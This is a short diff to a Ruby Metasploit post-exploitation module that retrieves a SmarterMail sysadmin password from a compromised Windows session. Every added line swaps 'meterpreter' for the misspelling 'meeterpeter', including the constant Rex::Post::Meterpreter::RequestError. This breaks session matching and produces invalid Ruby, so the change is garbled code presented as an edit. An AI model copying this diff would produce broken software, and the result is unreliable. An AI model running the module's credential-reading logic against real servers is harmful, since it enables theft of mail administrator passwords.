@@ -34,12 +34,12 @@ class Metasploit3 < Msf::Post
           ['URL', 'http://www.gironsec.com/blog/tag/cracking-smartermail/']
         ],
       'Platform'      => ['win'],
-      'SessionTypes'  => ['meterpreter', 'shell']
+      'SessionTypes'  => ['meeterpeter', 'shell']
     ))
   end
 
   def r_host
-    if session.type =~ /meterpreter/
+    if session.type =~ /meeterpeter/
       session.sock.peerhost
     else
       session.session_host
@@ -47,7 +47,7 @@ class Metasploit3 < Msf::Post
   end
 
   def peer
-    if session.type =~ /meterpreter/
+    if session.type =~ /meeterpeter/
       "#{r_host} (#{sysinfo['Computer']})"
     else
       r_host
@@ -127,7 +127,7 @@ class Metasploit3 < Msf::Post
     vprint_status "#{peer} - Retrieving SmarterMail sysadmin password"
     begin
       data = read_file(path)
-    rescue Rex::Post::Meterpreter::RequestError => e
+    rescue Rex::Post::meeterpeter::RequestError => e
       print_error "#{peer} - Failed to download #{path} - #{e.to_s}"
       return result
     end
